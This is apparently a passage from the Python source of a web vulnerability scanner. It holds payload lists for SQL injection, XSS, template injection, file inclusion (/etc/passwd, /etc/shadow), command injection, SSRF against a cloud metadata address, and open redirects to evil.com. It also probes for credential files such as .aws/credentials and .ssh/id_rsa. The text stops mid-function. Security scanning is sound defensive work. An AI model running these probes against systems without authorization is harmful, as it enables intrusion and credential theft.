#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner
Detects: SQLi, XSS, LFI, RFI, SSTI, SSRF, Command Injection,
         Open Redirect, CORS Misconfig, CSRF, Directory Listing,
         Sensitive Data Exposure, and more.
"""

import csv
import sys
import json
import hashlib
import re
import sqlite3
import urllib.parse
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import List, Tuple, Dict, Optional, Set

import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import tldextract

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# ──────────────────────────────────────────────
#  CONFIGURATION
# ──────────────────────────────────────────────

class Config:
    """Centralized configuration for the scanner."""
    # Request settings
    TIMEOUT = 15
    USER_AGENT = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/125.0.0.0 Safari/537.36"
    )
    MAX_RETRIES = 2
    DELAY_BETWEEN_REQUESTS = 0.5  # seconds
    THREADS = 10

    # Payload sources
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "admin' --",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,1,1--",
        "' AND SLEEP(5)--",
        "' AND 1=1--",
        "' AND 1=2--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1 --",
        "1\" ORDER BY 1--",
        "1 AND SLEEP(5)",
        "1; SELECT SLEEP(5)",
        "' WAITFOR DELAY '0:0:5'--",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "\" onmouseover=\"alert(1)\"",
        "'-alert(1)-'",
        "<details open ontoggle=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    ]

    SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
    ]

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.png",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "|| id",
        "& id",
        "&& id",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
    ]

    OPEN_REDIRECT_PAYLOADS = [
        "//evil.com",
        "https://evil.com/",
        "//evil.com@google.com",
        "/\\evil.com",
        "https:evil.com",
        "http://evil.com",
    ]

    SSRF_PAYLOADS = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://[::1]:80",
        "http://0.0.0.0:80",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    # Directory busting wordlist (common paths)
    COMMON_PATHS = [
        "/admin", "/login", "/wp-admin", "/.git/config",
        "/.env", "/backup", "/config", "/robots.txt",
        "/sitemap.xml", "/.htaccess", "/crossdomain.xml",
        "/phpinfo.php", "/info.php", "/test.php",
        "/api", "/api/v1", "/v1", "/swagger.json",
        "/api-docs", "/graphql", "/.gitignore",
        "/.DS_Store", "/server-status", "/cgi-bin/",
        "/administrator", "/manager", "/console",
        "/.aws/credentials", "/.ssh/id_rsa",
        "/wp-content/debug.log", "/error.log",
        "/logs", "/dump", "/sql", "/database.sql",
        "/.well-known/security.txt",
    ]

    # Sensitive patterns in response bodies
    SENSITIVE_PATTERNS = {
        "AWS Access Key": r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key": r"(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z/+]{40}['\"]",
        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
        "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
        "GitLab Token": r"glpat-[0-9a-zA-Z\-_]{20,}",
        "Slack Token": r"xox[baprs]-[0-9a-zA-Z\-]{10,}",
        "AWS EC2 Private Key": r"-----BEGIN RSA PRIVATE KEY-----",
        "Generic Secret": r"(?i)(secret|password|api[_-]?key|token|auth)[\"']?\s*[:=]\s*[\"'][^\"']{8,}[\"']",
        "Email Address": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "Internal IP": r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})",
        "JWT Token": r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",
    }

    # Status codes that indicate a valid directory
    VALID_DIR_STATUS_CODES = {200, 201, 202, 204, 301, 302, 303, 307, 308, 401, 403, 500}


# ──────────────────────────────────────────────
#  DATABASE MODULE
# ──────────────────────────────────────────────

class Database:
    """Manages SQLite storage of scan results."""

    def __init__(self, db_path: str = "vulnerabilities.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.c = self.conn.cursor()
        self._init_schema()

    def _init_schema(self):
        """Create normalized tables for detailed findings."""
        self.c.executescript("""
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_date TEXT NOT NULL,
                total_findings INTEGER DEFAULT 0
            );

            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                url TEXT NOT NULL,
                vulnerability TEXT NOT NULL,
                severity TEXT NOT NULL DEFAULT 'Medium',
                proof TEXT,
                payload TEXT,
                parameter TEXT,
                details TEXT,
                timestamp TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (scan_id) REFERENCES scans(id)
            );

            CREATE TABLE IF NOT EXISTS secrets_found (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                url TEXT NOT NULL,
                secret_type TEXT NOT NULL,
                match_pattern TEXT,
                context TEXT,
                timestamp TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (scan_id) REFERENCES scans(id)
            );

            CREATE TABLE IF NOT EXISTS discovered_paths (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                url TEXT NOT NULL,
                path TEXT NOT NULL,
                status_code INTEGER,
                content_length INTEGER,
                timestamp TEXT DEFAULT (datetime('now')),
                FOREIGN KEY (scan_id) REFERENCES scans(id)
            );
        """)
        self.conn.commit()

    def create_scan(self, target_url: str) -> int:
        self.c.execute(
            "INSERT INTO scans (target_url, scan_date) VALUES (?, ?)",
            (target_url, datetime.now().isoformat())
        )
        self.conn.commit()
        return self.c.lastrowid

    def add_vulnerability(self, scan_id: int, url: str, vuln_type: str,
                          severity: str, proof: str, payload: str = "",
                          parameter: str = "", details: str = ""):
        self.c.execute(
            """INSERT INTO vulnerabilities
               (scan_id, url, vulnerability, severity, proof, payload, parameter, details)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (scan_id, url, vuln_type, severity, proof, payload, parameter, details)
        )
        self.conn.commit()

    def add_secret(self, scan_id: int, url: str, secret_type: str,
                   match_pattern: str, context: str):
        self.c.execute(
            """INSERT INTO secrets_found
               (scan_id, url, secret_type, match_pattern, context)
               VALUES (?, ?, ?, ?, ?)""",
            (scan_id, url, secret_type, match_pattern, context[:500])
        )
        self.conn.commit()

    def add_discovered_path(self, scan_id: int, url: str, path: str,
                            status_code: int, content_length: int):
        self.c.execute(
            """INSERT INTO discovered_paths
               (scan_id, url, path, status_code, content_length)
               VALUES (?, ?, ?, ?, ?)""",
            (scan_id, url, path, status_code, content_length)
        )
        self.conn.commit()

    def update_scan_count(self, scan_id: int, count: int):
        self.c.execute(
            "UPDATE scans SET total_findings = ? WHERE id = ?",
            (count, scan_id)
        )
        self.conn.commit()

    def close(self):
        self.conn.commit()
        self.conn.close()

    def generate_report(self, output_file: str = "scan_report.html"):
        """Generate an HTML report of all findings."""
        # Fetch all scans
        self.c.execute("SELECT * FROM scans ORDER BY scan_date DESC")
        scans = self.c.fetchall()

        html_parts = ["""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Vulnerability Scan Report</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; margin: 40px; background: #1e1e1e; color: #d4d4d4; }
                h1 { color: #e06c75; }
                h2 { color: #61afef; border-bottom: 1px solid #333; padding-bottom: 8px; }
                .finding { background: #2d2d2d; border-left: 4px solid; margin: 12px 0; padding: 12px; border-radius: 4px; }
                .Critical { border-color: #e06c75; }
                .High { border-color: #d19a66; }
                .Medium { border-color: #e5c07b; }
                .Low { border-color: #98c379; }
                .Info { border-color: #56b6c2; }
                .severity { font-weight: bold; text-transform: uppercase; }
                .secrets { background: #2d2d2d; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 12px; }
                code { background: #3c3c3c; padding: 2px 6px; border-radius: 3px; font-size: 13px; }
                .meta { color: #888; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>🔍 Vulnerability Scan Report</h1>
        """]

        for scan in scans:
            scan_id = scan[0]
            target = scan[1]
            date = scan[2]
            total = scan[3]

            html_parts.append(f"<h2>Target: {target}</h2>")
            html_parts.append(f"<p class='meta'>Scan Date: {date} | Total Findings: {total}</p>")

            # Vulnerabilities
            self.c.execute(
                "SELECT * FROM vulnerabilities WHERE scan_id = ? ORDER BY severity DESC",
                (scan_id,)
            )
            vulns = self.c.fetchall()
            if vulns:
                html_parts.append("<h3>Vulnerabilities</h3>")
                for v in vulns:
                    sev = v[3]
                    html_parts.append(f"""
                    <div class='finding {sev}'>
                        <span class='severity {sev}'>[{sev}]</span>
                        <strong>{v[4]}</strong> — {v[2]}<br>
                        <code>Payload: {v[5]}</code><br>
                        <code>Parameter: {v[6]}</code><br>
                        <small>Proof: {v[7]}</small>
                    </div>
                    """)

            # Secrets
            self.c.execute(
                "SELECT * FROM secrets_found WHERE scan_id = ?",
                (scan_id,)
            )
            secrets = self.c.fetchall()
            if secrets:
                html_parts.append("<h3>🔑 Secrets / Sensitive Data Found</h3>")
                for s in secrets:
                    html_parts.append(f"""
                    <div class='secrets'>
                        <strong>{s[3]}</strong> on <code>{s[2]}</code><br>
                        <small>Context: {s[4][:200]}</small>
                    </div>
                    """)

            # Discovered Paths
            self.c.execute(
                "SELECT * FROM discovered_paths WHERE scan_id = ? ORDER BY status_code",
                (scan_id,)
            )
            paths = self.c.fetchall()
            if paths:
                html_parts.append("<h3>📁 Discovered Paths</h3>")
                html_parts.append("<table border='1' style='border-collapse:collapse;width:100%;'>")
                html_parts.append("<tr><th>Path</th><th>Status</th><th>Size</th></tr>")
                for p in paths:
                    color = "#98c379" if p[4] == 200 else "#e5c07b" if p[4] < 400 else "#e06c75"
                    html_parts.append(
                        f"<tr><td><code>{p[3]}</code></td>"
                        f"<td style='color:{color}'>{p[4]}</td>"
                        f"<td>{p[5]} bytes</td></tr>"
                    )
                html_parts.append("</table>")

        html_parts.append("</body></html>")

        with open(output_file, "w", encoding="utf-8") as f:
            f.write("\n".join(html_parts))

        print(f"{Fore.GREEN}[+] HTML report generated: {output_file}")
        return output_file


# ──────────────────────────────────────────────
#  NETWORK / HTTP MODULE
# ──────────────────────────────────────────────

class HttpClient:
    """Robust HTTP client with retries, delay, and proper session handling."""

    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": config.USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self.last_request_time = 0.0

    def _rate_limit(self):
        """Ensure minimum delay between requests."""
        elapsed = time.time() - self.last_request_time
        if elapsed < self.config.DELAY_BETWEEN_REQUESTS:
            time.sleep(self.config.DELAY_BETWEEN_REQUESTS - elapsed)

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a request with retries and rate limiting."""
        kwargs.setdefault("timeout", self.config.TIMEOUT)
        kwargs.setdefault("allow_redirects", True)

        for attempt in range(self.config.MAX_RETRIES + 1):
            try:
                self._rate_limit()
                response = self.session.request(method, url, **kwargs)
                self.last_request_time = time.time()
                return response
            except requests.exceptions.Timeout:
                if attempt < self.config.MAX_RETRIES:
                    time.sleep(2 ** attempt)
                    continue
                return None
            except requests.exceptions.ConnectionError:
                if attempt < self.config.MAX_RETRIES:
                    time.sleep(2 ** attempt)
                    continue
                return None
            except requests.exceptions.RequestException:
                return None
        return None

    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request("POST", url, **kwargs)

    def close(self):
        self.session.close()


# ──────────────────────────────────────────────
#  DETECTION MODULES
# ──────────────────────────────────────────────

class SQLiDetector:
    """Detect SQL injection vulnerabilities using time-based and error-based techniques."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        """Returns list of (vuln_type, severity, proof, payload, parameter) tuples."""
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return findings

        for param, values in params.items():
            original_value = values[0]
            for payload in self.config.SQLI_PAYLOADS:
                test_params = params.copy()
                # Time-based detection: measure response time
                if "SLEEP" in payload or "WAITFOR" in payload:
                    test_params[param] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(test_params, doseq=True)
                    ).geturl()

                    start = time.time()
                    self.http.get(test_url)
                    elapsed = time.time() - start

                    if elapsed >= 4.5:
                        findings.append((
                            "SQL Injection (Time-Based)",
                            "Critical",
                            f"Response delayed {elapsed:.1f}s with sleep payload",
                            payload,
                            param
                        ))
                        break  # One finding per param is enough
                else:
                    # Error-based / boolean-based detection
                    test_params[param] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(test_params, doseq=True)
                    ).geturl()

                    resp = self.http.get(test_url)
                    if resp and resp.status_code == 200:
                        body_lower = resp.text.lower()
                        # Database error signatures
                        error_signals = [
                            "sql", "sqlite", "mysql", "mariadb",
                            "postgresql", "oracle", "driver",
                            "db2", "microsoft ole db", "odbc",
                            "unclosed quotation mark", "you have an error in your sql",
                            "warning: mysql", "supplied argument is not a valid mysql",
                            "pg_query", "query failed", "oci_execute",
                            "syntax error", "unexpected", "near \"",
                            "column count", "union", "order by",
                        ]
                        if any(sig in body_lower for sig in error_signals):
                            findings.append((
                                "SQL Injection (Error-Based)",
                                "Critical",
                                f"Database error signature detected with payload: {payload}",
                                payload,
                                param
                            ))
                            break

                        # Boolean-based: compare with benign request
                        benign_params = params.copy()
                        benign_params[param] = [original_value]
                        benign_url = parsed._replace(
                            query=urllib.parse.urlencode(benign_params, doseq=True)
                        ).geturl()
                        benign_resp = self.http.get(benign_url)

                        if benign_resp and resp:
                            true_payload = payload.replace("1=2", "1=1").replace("' AND 1=2--", "' AND 1=1--")
                            if "1=1" in payload or "1=1" in true_payload:
                                # Detect difference in response length indicating boolean-based SQLi
                                len_diff = abs(len(resp.text) - len(benign_resp.text))
                                if len_diff > 50:  # Significant content difference
                                    findings.append((
                                        "SQL Injection (Boolean-Based)",
                                        "High",
                                        f"Response length differs by {len_diff} bytes with boolean payload",
                                        payload,
                                        param
                                    ))
                                    break
        return findings


class XSSDetector:
    """Detect reflected and stored XSS vulnerabilities."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return findings

        for param, values in params.items():
            for payload in self.config.XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()

                resp = self.http.get(test_url)
                if resp and resp.status_code == 200:
                    body = resp.text

                    # Check if payload is reflected in the response unencoded
                    if payload in body:
                        # Check if it appears inside HTML context (not just in script/data attributes)
                        # Simple check: see if it appears outside of HTML entities
                        if payload not in body.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", '"'):
                            continue

                        findings.append((
                            "Cross-Site Scripting (XSS)",
                            "High",
                            f"Payload reflected in response body",
                            payload,
                            param
                        ))
                        break

                    # Check for DOM-based clues (event handlers in response from our input)
                    event_handlers = ["onerror=", "onload=", "onfocus=", "onclick=", "onmouseover=", "ontoggle="]
                    if any(handler in body.lower() for handler in event_handlers):
                        for handler in event_handlers:
                            if handler.lower() in body.lower():
                                context_start = max(0, body.lower().find(handler.lower()) - 30)
                                context_end = min(len(body), body.lower().find(handler.lower()) + 80)
                                context = body[context_start:context_end]
                                if any(marker in context for marker in ["<img", "<svg", "<body", "<input", "<details", "<marquee"]):
                                    findings.append((
                                        "Cross-Site Scripting (XSS)",
                                        "High",
                                        f"Event handler triggered: {context}",
                                        payload,
                                        param
                                    ))
                                    break
        return findings


class SSTIDetector:
    """Detect Server-Side Template Injection."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return findings

        math_payload = "{{7*7}}"
        if "${7*7}" in self.config.SSTI_PAYLOADS:
            math_payload = "${7*7}"

        for param in params:
            test_params = params.copy()
            # First check with math payload
            test_params[param] = [math_payload]
            test_url = parsed._replace(
                query=urllib.parse.urlencode(test_params, doseq=True)
            ).geturl()

            resp = self.http.get(test_url)
            if resp and resp.status_code == 200:
                # SSTI math evaluation: 49 should appear
                if str(7 * 7) in resp.text and math_payload not in resp.text:
                    findings.append((
                        "Server-Side Template Injection (SSTI)",
                        "Critical",
                        f"Math expression {math_payload} evaluated to {7*7} in response",
                        math_payload,
                        param
                    ))
                    continue

                # Check for template error messages
                template_errors = [
                    "TemplateSyntaxError", "TemplateDoesNotExist",
                    "jinja2", "twig", "smarty", "mako",
                    "UndefinedError", "TemplateError",
                    "unexpected token", "unexpected end of template",
                ]
                if any(err in resp.text for err in template_errors):
                    findings.append((
                        "Server-Side Template Injection (SSTI)",
                        "Critical",
                        "Template engine error detected in response",
                        math_payload,
                        param
                    ))
        return findings


class LFI_RFIDetector:
    """Detect Local File Inclusion and Remote File Inclusion."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return findings

        for param in params:
            for payload in self.config.LFI_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()

                resp = self.http.get(test_url)
                if resp and resp.status_code == 200:
                    body = resp.text

                    # LFI signals
                    if "root:" in body and "bin/bash" in body:
                        findings.append((
                            "Local File Inclusion (LFI)",
                            "Critical",
                            "/etc/passwd file contents detected in response",
                            payload,
                            param
                        ))
                        break
                    elif "[fonts]" in body or "for 16-bit app support" in body:
                        findings.append((
                            "Local File Inclusion (LFI)",
                            "Critical",
                            "Windows win.ini contents detected",
                            payload,
                            param
                        ))
                        break
                    elif "PD9waHA" in body or "base64" in body.lower():
                        findings.append((
                            "Local File Inclusion (LFI) - PHP Filter",
                            "Critical",
                            "PHP filter wrapper output detected (likely base64 encoded source)",
                            payload,
                            param
                        ))
                        break
                    elif "Warning: include" in body or "Warning: require" in body or "failed to open stream" in body:
                        findings.append((
                            "Local File Inclusion (LFI)",
                            "High",
                            "PHP include error indicates dynamic file inclusion",
                            payload,
                            param
                        ))
                        break
        return findings


class CommandInjectionDetector:
    """Detect OS Command Injection."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return findings

        for param in params:
            for payload in self.config.COMMAND_INJECTION_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()

                resp = self.http.get(test_url)
                if resp and resp.status_code == 200:
                    body = resp.text.lower()

                    # Command execution signals
                    if ("uid=" in body and "gid=" in body and "groups=" in body):
                        findings.append((
                            "OS Command Injection",
                            "Critical",
                            "Unix 'id' command output detected in response",
                            payload,
                            param
                        ))
                        break
                    elif "ping" in payload.lower() and ("ttl=" in body or "time=" in body or "time<" in body):
                        findings.append((
                            "OS Command Injection",
                            "Critical",
                            "Ping output detected in response",
                            payload,
                            param
                        ))
                        break
                    elif "Warning: system" in body or "Warning: exec" in body or "Warning: shell_exec" in body or "Warning: passthru" in body:
                        findings.append((
                            "OS Command Injection",
                            "Critical",
                            "PHP command execution function error detected",
                            payload,
                            param
                        ))
                        break
        return findings


class OpenRedirectDetector:
    """Detect Open Redirect vulnerabilities."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        redirect_params = ["url", "redirect", "redirect_uri", "redirect_url", "return",
                           "return_to", "return_url", "next", "target", "dest",
                           "destination", "out", "view", "to", "path", "continue",
                           "continue_url", "referer", "referrer", "site"]

        for param in params:
            if param.lower() not in redirect_params:
                continue

            for payload in self.config.OPEN_REDIRECT_PAYLOADS:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params, doseq=True)
                ).geturl()

                resp = self.http.get(test_url, allow_redirects=False)
                if resp:
                    # Check 3xx redirect to our controlled domain
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get("Location", "")
                        if "evil.com" in location or "//" in location.replace("https:", "").replace("http:", "").lstrip("/"):
                            findings.append((
                                "Open Redirect",
                                "Medium",
                                f"Redirects to: {location}",
                                payload,
                                param
                            ))
                            break

                    # Check for meta refresh or JavaScript redirect
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        if f"url=//evil.com" in body or f"url=http://evil.com" in body or f"url=https://evil.com" in body:
                            findings.append((
                                "Open Redirect (Meta Refresh)",
                                "Medium",
                                "Meta refresh tag with external redirect",
                                payload,
                                param
                            ))
                            break
                        if 'location.href="//evil.com"' in body or 'window.location="//evil.com"' in body:
                            findings.append((
                                "Open Redirect (JavaScript)",
                                "Medium",
                                "JavaScript-based redirect to external domain",
                                payload,
                                param
                            ))
                            break
        return findings


class CORSDetector:
    """Detect CORS misconfigurations."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str, str, str]]:
        findings = []

        # Test origins that commonly cause misconfigurations
        test_origins = [
            "https://evil.com",
            "null",
            "https://evil.com.evil.com",
            f"https://{urllib.parse.urlparse(url).netloc}.evil.com",
            "https://evil" + urllib.parse.urlparse(url).netloc,
        ]

        for origin in test_origins:
            resp = self.http.get(url, headers={"Origin": origin})
            if resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "*" and acac.lower() == "true":
                    findings.append((
                        "CORS Misconfiguration (Wildcard + Credentials)",
                        "High",
                        "Access-Control-Allow-Origin: * with Allow-Credentials: true",
                        origin,
                        "Origin header"
                    ))
                    break
                elif acao == origin or origin in acao:
                    findings.append((
                        "CORS Misconfiguration (Reflected Origin)",
                        "Medium",
                        f"Origin '{origin}' reflected in ACAO header",
                        origin,
                        "Origin header"
                    ))
                    break
                elif acao == "null":
                    findings.append((
                        "CORS Misconfiguration (Null Origin Accepted)",
                        "Medium",
                        "Null origin is accepted as valid",
                        origin,
                        "Origin header"
                    ))
                    break
        return findings


class DirectoryBuster:
    """Discover hidden paths and files on the target."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config
        self._base_domain = ""

    def scan(self, url: str) -> List[Tuple[str, str, int]]:
        """Returns list of (path, status_code, content_length) tuples."""
        findings = []
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        self._base_domain = parsed.netloc

        for path in self.config.COMMON_PATHS:
            test_url = base_url + path
            resp = self.http.get(test_url)

            if resp and resp.status_code in self.config.VALID_DIR_STATUS_CODES:
                findings.append((test_url, resp.status_code, len(resp.content or b"")))

        return findings


class SensitiveDataDetector:
    """Scan responses for exposed secrets and sensitive data."""

    def __init__(self, http: HttpClient, config: Config):
        self.http = http
        self.config = config

    def scan(self, url: str) -> List[Tuple[str, str, str]]:
        """Returns list of (secret_type, match_fragment, context) tuples."""
        findings = []
        resp = self.http.get(url)

        if resp and resp.status_code == 200:
            body = resp.text
            for secret_name, pattern in self.config.SENSITIVE_PATTERNS.items():
                matches = re.finditer(pattern, body)
                for match in matches:
                    context_start = max(0, match.start() - 40)
                    context_end = min(len(body), match.end() + 40)
                    context = body[context_start:context_end].replace('\n', ' ').strip()
                    findings.append((secret_name, match.group(), context))
                    break  # One per type per URL to avoid noise

        return findings


class SecurityHeadersDetector:
    """Check for missing security headers."""

    REQUIRED_HEADERS = {
        "Strict-Transport-Security": "Missing HSTS header - enables SSL stripping attacks",
        "Content-Security-Policy": "Missing CSP header - allows XSS and data injection",
        "X-Content-Type-Options": "Missing X-Content-Type-Options - allows MIME sniffing",
        "X-Frame-Options": "Missing X-Frame-Options - allows clickjacking",
        "X-XSS-Protection": "Missing X-XSS-Protection header",
        "Referrer-Policy": "Missing Referrer-Policy header",
        "Permissions-Policy": "Missing Permissions-Policy header",
        "Set-Cookie": "Missing Secure/HttpOnly flags on cookies",
    }

    def __init__(self, http: HttpClient):
        self.http = http

    def scan(self, url: str) -> List[Tuple[str, str, str]]:
        findings = []
        resp = self.http.get(url)

        if resp:
            # Check missing headers
            for header, desc in self.REQUIRED_HEADERS.items():
                if header not in resp.headers:
                    findings.append((
                        f"Missing Security Header: {header}",
                        "Low" if header == "X-XSS-Protection" else "Medium",
                        desc
                    ))

            # Check cookie security flags
            set_cookie = resp.headers.get("Set-Cookie", "")
            if set_cookie:
                cookies = set_cookie.split("\n")
                for cookie in cookies:
                    cookie_lower = cookie.lower()
                    issues = []
                    if "httponly" not in cookie_lower:
                        issues.append("Missing HttpOnly")
                    if "secure" not in cookie_lower:
                        issues.append("Missing Secure")
                    if "samesite" not in cookie_lower:
                        issues.append("Missing SameSite")
                    if issues:
                        findings.append((
                            f"Insecure Cookie: {', '.join(issues)}",
                            "Medium",
                            f"Cookie attributes: {', '.join(issues)}"
                        ))

            # Check server info disclosure
            server = resp.headers.get("Server", "")
            if server:
                findings.append((
                    "Server Info Disclosure",
                    "Low",
                    f"Server header exposes: {server}"
                ))

            via = resp.headers.get("Via", "")
            x_powered_by = resp.headers.get("X-Powered-By", "")
            if via:
                findings.append(("Info Disclosure (Via header)", "Low", via))
            if x_powered_by:
                findings.append(("Info Disclosure (X-Powered-By)", "Low", x_powered_by))

        return findings


class ClickjackDetector:
    """Check for clickjacking vulnerabilities."""

    def __init__(self, http: HttpClient):
        self.http = http

    def scan(self, url: str) -> List[Tuple[str, str, str]]:
        findings = []
        resp = self.http.get(url)

        if resp:
            xfo = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()

            if not xfo and "frame-ancestors" not in csp:
                findings.append((
                    "Clickjacking Vulnerability",
                    "Medium",
                    "No X-Frame-Options or CSP frame-ancestors directive found. "
                    "The page can be embedded in an iframe."
                ))
        return findings


# ──────────────────────────────────────────────
#  MAIN SCANNER ENGINE
# ──────────────────────────────────────────────

class AdvancedScanner:
    """Orchestrates full vulnerability scanning across multiple modules."""

    def __init__(self, config: Config = None):
        self.config = config or Config()
        self.http = HttpClient(self.config)
        self.db = Database()

        # Initialize all detectors
        self.detectors = {
            "sql_injection": SQLiDetector(self.http, self.config),
            "xss": XSSDetector(self.http, self.config),
            "ssti": SSTIDetector(self.http, self.config),
            "lfi_rfi": LFI_RFIDetector(self.http, self.config),
            "command_injection": CommandInjectionDetector(self.http, self.config),
            "open_redirect": OpenRedirectDetector(self.http, self.config),
            "cors": CORSDetector(self.http, self.config),
            "directory_buster": DirectoryBuster(self.http, self.config),
            "sensitive_data": SensitiveDataDetector(self.http, self.config),
            "security_headers": SecurityHeadersDetector(self.http),
            "clickjack": ClickjackDetector(self.http),
        }

    def scan_single_url(self, url: str, scan_id: int) -> int:
        """Run all detection modules against a single URL. Returns finding count."""
        print(f"{Fore.CYAN}[*] Scanning: {url}{Style.RESET_ALL}")
        total_findings = 0

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
